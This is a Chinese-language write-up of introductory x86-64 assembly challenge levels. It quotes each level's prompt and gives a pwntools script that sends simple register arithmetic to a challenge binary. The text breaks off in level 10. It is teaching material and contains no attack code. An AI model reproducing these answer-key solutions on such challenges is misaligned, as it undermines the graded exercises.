binary --only-section=.text ./<span class="hljs-keyword">asm</span>.o ./<span class="hljs-keyword">asm</span>.bin &amp;&amp; cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>在这个关卡中，您将使用寄存器。您将被要求修改或读取寄存器的值。<br><br>在这个关卡中，您将使用多个寄存器。请设置以下值：<br>  rax = <span class="hljs-number">0x1337</span><br>  r12 = <span class="hljs-number">0xCAFED00D1337BEEF</span><br>  rsp = <span class="hljs-number">0x31337</span><br></code></pre></td></tr></table></figure><p>类似上面，给shellcode追加点asm即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br><span class="hljs-comment"># 设置寄存器的值</span><br>shellcode = asm(<span class="hljs-string">&#x27;mov rax, 0x1337&#x27;</span>)<br>shellcode += asm(<span class="hljs-string">&#x27;mov r12, 0xCAFED00D1337BEEF&#x27;</span>)<br>shellcode += asm(<span class="hljs-string">&#x27;mov rsp, 0x31337&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(shellcode)<br><br>pause()<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>为了与任何级别进行交互，你需要通过标准输入(stdin)发送原始字节给这个程序。<br>为了高效地解决这些问题，首先运行程序以查看挑战说明。<br>然后编写、汇编并将字节发送给该程序。<br><br>例如，如果你将汇编代码写在 asm.S 文件中，可以将其汇编为目标文件：<br>  <span class="hljs-keyword">as</span> -o asm.o asm.S<br><br>然后，将 .text 段（你的代码）复制到 asm.<span class="hljs-built_in">bin</span> 文件中：<br>  objcopy -O binary --only-section=.text asm.o asm.<span class="hljs-built_in">bin</span><br><br>最后，将其发送给挑战程序：<br>  cat ./asm.<span class="hljs-built_in">bin</span> | /challenge/run<br><br>你甚至可以将其作为一个命令运行：<br>  <span class="hljs-keyword">as</span> -o asm.o asm.S &amp;&amp; objcopy -O binary --only-section=.text ./asm.o ./asm.<span class="hljs-built_in">bin</span> &amp;&amp; cat ./asm.<span class="hljs-built_in">bin</span> | /challenge/run<br><br>在这个级别中，你将使用寄存器进行操作。你将被要求修改或读取寄存器的值。<br><br>我们将在每次运行之前动态设置一些值到内存中。每次运行时这些值会发生变化。这意味着你需要对寄存器进行某种形式的计算操作。我们会告诉你哪些寄存器被设置以及你应该将结果放在哪里。在大多数情况下，结果应该放在 rax 寄存器中。<br><br>x86 指令集中存在许多可以对寄存器和内存执行常规数学运算的指令。<br><br>简写形式中，当我们说 A += B 时，实际上是 A = A + B。<br><br>以下是一些有用的指令：<br>  add reg1, reg2       &lt;=&gt;     reg1 += reg2<br>  sub reg1, reg2       &lt;=&gt;     reg1 -= reg2<br>  imul reg1, reg2      &lt;=&gt;     reg1 *= reg2<br><br>除法(div)更复杂，我们稍后会讨论它。<br>注意：所有的 <span class="hljs-string">&#x27;regX&#x27;</span> 都可以替换为常数或内存位置。<br><br>请执行以下操作：<br>  将 <span class="hljs-number">0x331337</span> 加到 rdi 中<br><br>现在，我们将进行以下设置以准备你的代码：<br>  rdi = <span class="hljs-number">0x937</span><br>  <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;add rdi, 0x331337&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>两个寄存器相乘，加上另一个寄存器，然后结果赋值给rax</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    imul rdi,rsi</span><br><span class="hljs-string">    mov rax,rdi</span><br><span class="hljs-string">    add rax,rdx&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用寄存器进行操作。你将被要求修改或读取寄存器的值。<br><br>我们将在每次运行之前动态设置一些值到内存中。每次运行时这些值会发生变化。这意味着你需要对寄存器进行某种形式的计算操作。我们会事先告诉你哪些寄存器已经设置，并且你应该将结果放在哪里。在大多数情况下，结果应该放在 <span class="hljs-built_in">rax</span> 寄存器中。<br><br>在 x86 中，除法与普通数学中的除法有所不同。这里的数学称为整数运算。这意味着每个值都是一个整数。<br><br>举个例子：<span class="hljs-number">10</span> / <span class="hljs-number">3</span> = <span class="hljs-number">3</span> 在整数运算中。<br><br>为什么呢？<br><br>因为 <span class="hljs-number">3.33</span> 被舍入为一个整数。<br><br>在这个级别中，与除法相关的指令是：<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, reg1<span class="hljs-comment">; div reg2</span><br><br>注意：<span class="hljs-keyword">div</span> 是一条特殊的指令，可以将一个 <span class="hljs-number">128</span> 位的被除数除以一个 <span class="hljs-number">64</span> 位的除数，并且只使用一个寄存器作为操作数来存储商和余数。<br><br>这个复杂的 <span class="hljs-keyword">div</span> 指令如何工作并操作一个 <span class="hljs-number">128</span> 位的被除数（它是寄存器大小的两倍）？<br><br>对于指令：<span class="hljs-keyword">div</span> reg，以下操作发生：<br>  <span class="hljs-built_in">rax</span> = <span class="hljs-built_in">rdx</span>:<span class="hljs-built_in">rax</span> / reg<br>  <span class="hljs-built_in">rdx</span> = 余数<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">rdx:</span><span class="hljs-built_in">rax</span> 表示 <span class="hljs-built_in">rdx</span> 是 <span class="hljs-number">128</span> 位被除数的高 <span class="hljs-number">64</span> 位，<span class="hljs-built_in">rax</span> 是 <span class="hljs-number">128</span> 位被除数的低 <span class="hljs-number">64</span> 位。<br><br>在调用 <span class="hljs-keyword">div</span> 之前，你必须小心 <span class="hljs-built_in">rdx</span> 和 <span class="hljs-built_in">rax</span> 中的内容。<br><br>请计算以下内容：<br>  speed = distance / time，其中：<br>    distance = <span class="hljs-built_in">rdi</span><br>    time = <span class="hljs-built_in">rsi</span><br>    speed = <span class="hljs-built_in">rax</span><br><br>注意，distance 最多是一个 <span class="hljs-number">64</span> 位的值，所以在除法运算时 <span class="hljs-built_in">rdx</span> 应该为 <span class="hljs-number">0</span>。<br><br>现在，我们将进行以下设置以准备你的代码：<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x1d8c</span><br>  <span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x40</span><br></code></pre></td></tr></table></figure><p>计算speed = distance / time</p><ul><li>distance 最多是一个 64 位的值，所以在除法运算时 rdx 应该为 0</li><li>  rax = rdx:rax / reg  ; rdx = 余数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rdx , rdx </span><br><span class="hljs-string">    mov rax,rdi  </span><br><span class="hljs-string">    div rsi &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure></li></ul><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用寄存器进行操作。你将被要求修改或读取寄存器的值。<br><br>我们将在每次运行之前动态设置一些值到内存中。每次运行时这些值会发生变化。这意味着你需要对寄存器进行某种形式的计算操作。我们会事先告诉你哪些寄存器已经设置，并且你应该将结果放在哪里。在大多数情况下，结果应该放在 <span class="hljs-built_in">rax</span> 寄存器中。<br><br>在汇编中，模运算是另一个有趣的概念！<br><br>x86 允许你在除法运算后获取余数。<br><br>例如：<span class="hljs-number">10</span> / <span class="hljs-number">3</span> -&gt; 余数 = <span class="hljs-number">1</span><br><br>余数与模运算相同，模运算也称为 <span class="hljs-string">&quot;mod&quot;</span> 运算符。<br><br>在大多数编程语言中，我们用符号 <span class="hljs-string">&#x27;%&#x27;</span> 表示模运算。<br><br>请计算以下内容：  <br><span class="hljs-built_in">rdi</span> % <span class="hljs-built_in">rsi</span><br><br>将结果放入 <span class="hljs-built_in">rax</span> 寄存器中。<br><br>现在，我们将进行以下设置以准备你的代码：  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0xc799858</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x3f</span><br></code></pre></td></tr></table></figure><p>由于rax = rdx:rax / reg  ; rdx = 余数<br>因此rax=rax-rdx即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    div rsi</span><br><span class="hljs-string">    mov rax, rdx </span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">在这个级别中，你将使用寄存器进行操作。你将被要求修改或读取寄存器的值。<br><br>我们将在每次运行之前动态设置一些值到内存中。每次运行时这些值会发生变化。这意味着你需要对寄存器进行某种形式的计算操作。我们会事先告诉你哪些寄存器已经设置，并且你应该将结果放在哪里。在大多数情况下，结果应该放在 rax 寄存器中。<br><br>x86 中的另一个很酷的概念是能够独立访问低位寄存器字节。<br><br>在 x86_64 中，每个寄存器的大小为 64 位，在之前的级别中，我们使用 rax、rdi 或 rsi 来访问整个寄存器。<br><br>我们还可以使用不同的寄存器名称来访问每个寄存器的低位字节。<br><br>例如，可以使用 eax 来访问 rax 的低 32 位，使用 ax 来访问低 16 位，使用 al 来访问低 8 位。<br><br><br><span class="hljs-section">MSB                                    LSB</span><br><span class="hljs-section">+----------------------------------------+</span><br><span class="hljs-section">|                   rax                  |</span><br><span class="hljs-section">+--------------------+-------------------+</span><br><span class="hljs-code">                     |        eax        |</span><br><span class="hljs-code">                     +---------+---------+</span><br><span class="hljs-code">                               |   ax    |</span><br><span class="hljs-code">                               +----+----+</span><br><span class="hljs-code">                               | ah | al |</span><br><span class="hljs-code">                               +----+----+</span><br><br>几乎所有寄存器都可以访问低位寄存器字节。<br><br>请使用一条 move 指令将 ax 寄存器的高 8 位设置为 0x42。<br><br>现在，我们将进行以下设置以准备你的代码：  <br>rax = 0xee4491be45a500d8<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov ah, 0x42 </span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">事实证明，使用 <span class="hljs-keyword">div</span> 运算符计算模运算是很慢的！<br><br>我们可以使用一个数学技巧来优化模运算（%）。编译器经常使用这个技巧。<br><br>如果我们有 <span class="hljs-string">&quot;x % y&quot;</span>，并且 y 是 <span class="hljs-number">2</span> 的幂，比如 <span class="hljs-number">2</span>^n，那么结果将是 x 的低 n 位。<br><br>因此，我们可以使用低位寄存器字节访问来高效地实现模运算！<br><br>只能使用以下指令：  <br><span class="hljs-keyword">mov</span><br><br>请计算以下内容：  <br><span class="hljs-built_in">rax</span> = <span class="hljs-built_in">rdi</span> % <span class="hljs-number">256</span>  <br><span class="hljs-built_in">rbx</span> = <span class="hljs-built_in">rsi</span> % <span class="hljs-number">65536</span><br><br>现在，我们将进行以下设置以准备你的代码：  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x432e</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x97d4bdd6</span><br></code></pre></td></tr></table></figure><ul><li>256是8次方，65536是16次方</li><li>对应rdi的低八位和rsi的低16位</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov al, dil</span><br><span class="hljs-string">    mov bx, si</span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用位逻辑和操作。这将涉及直接与寄存器或内存位置中存储的位进行交互的操作。你还可能需要使用 x86 中的逻辑指令：<span class="hljs-keyword">and</span>、<span class="hljs-keyword">or</span>、<span class="hljs-keyword">not</span>、<span class="hljs-keyword">xor</span>。<br><br>在汇编中移动位是另一个有趣的概念！<br><br>x86 允许你在寄存器中“移动”位。<br><br>以 <span class="hljs-built_in">al</span> 为例，它是 <span class="hljs-built_in">rax</span> 的最低的 <span class="hljs-number">8</span> 位。<br><br><span class="hljs-built_in">al</span> 中的值（以位表示）为：<br>  <span class="hljs-built_in">rax</span> = <span class="hljs-number">10001010</span><br><br>如果我们使用 <span class="hljs-keyword">shl</span> 指令向左移动一次：<br>  <span class="hljs-keyword">shl</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">1</span><br><br>新的值为：<br>  <span class="hljs-built_in">al</span> = <span class="hljs-number">00010100</span><br><br>所有位向左移动，最高位掉落，同时在右侧添加了一个新的 <span class="hljs-number">0</span>。<br><br>你可以利用这一点对你关心的位进行特殊操作。<br><br>移位还具有快速乘法（乘以 <span class="hljs-number">2</span>）或除法（除以 <span class="hljs-number">2</span>）的好处，并且还可以用于计算模运算。<br><br>以下是重要的指令：<br>  <span class="hljs-keyword">shl</span> reg1, reg2       &lt;=&gt;     将 reg1 按 reg2 中的位数向左移动<br>  <span class="hljs-keyword">shr</span> reg1, reg2       &lt;=&gt;     将 reg1 按 reg2 中的位数向右移动<br>  注意：<span class="hljs-string">&#x27;reg2&#x27;</span> 可以由常数或内存位置替代<br><br>只能使用以下指令：<br>  <span class="hljs-keyword">mov</span>, <span class="hljs-keyword">shr</span>, <span class="hljs-keyword">shl</span><br><br>请执行以下操作：<br>  将 <span class="hljs-built_in">rax</span> 设置为 <span class="hljs-built_in">rdi</span> 的第 <span class="hljs-number">5</span> 个最低有效字节。<br><br>例如：<br>  <span class="hljs-built_in">rdi</span> = | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |<br>  将 <span class="hljs-built_in">rax</span> 设置为 B4 的值<br><br>现在，我们将进行以下设置以准备你的代码：<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x8902d4d2350b39b0</span><br></code></pre></td></tr></table></figure><p>先左移位3次，再右移位7次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br><span class="hljs-comment">#mov rax,rdi</span><br>    <span class="hljs-comment">#shl rax,24</span><br>    <span class="hljs-comment">#shr rax,32</span><br>    <br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    shl rdi,8*3</span><br><span class="hljs-string">    shr rdi,8*7</span><br><span class="hljs-string">    mov rax,rdi</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs coq">在这个级别中，你将使用位逻辑和操作。这将涉及直接与寄存器或内存位置中存储的位进行交互的操作。你还可能需要使用 x86 中的逻辑指令：and、or、not、xor。<br><br>在汇编中进行位逻辑运算是另一个有趣的概念！  <br>x86 